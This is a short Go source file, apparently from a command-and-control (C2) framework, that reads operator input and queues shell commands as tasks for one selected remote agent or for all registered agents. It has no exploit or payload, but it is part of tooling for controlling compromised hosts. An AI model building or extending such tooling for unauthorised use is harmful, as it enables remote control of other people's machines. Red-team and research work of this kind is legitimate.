package c2

import (
	"bufio"
	"os"
	"strings"
	"sync"
)

var command string

// TODO: Implement "help" command
var commands = []string{"select", "agents", "tasks", "alias", "session", "serve", "loglevel", "exit"}
var mu sync.Mutex

func GetCommands() {
	for {
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		mu.Lock()
		isShellCommand := true
		for _, command := range commands {
			if strings.Contains(input, command) {
				// go RunCommand(input)
				isShellCommand = false
				break
			}
		}
		if isShellCommand {
			if State.SelectedAgent.Alias == "ALL" {
				for _, agent := range State.RegisteredAgents {
					State.Tasks = append(State.Tasks, Task{Command: input, Recipient: agent})
				}
			} else if State.SelectedAgent.Alias != "NONE" {
				State.Tasks = append(State.Tasks, Task{Command: input, Recipient: Agent{UUID: State.SelectedAgent.UUID}})
			}
		}
		mu.Unlock()
	}
}
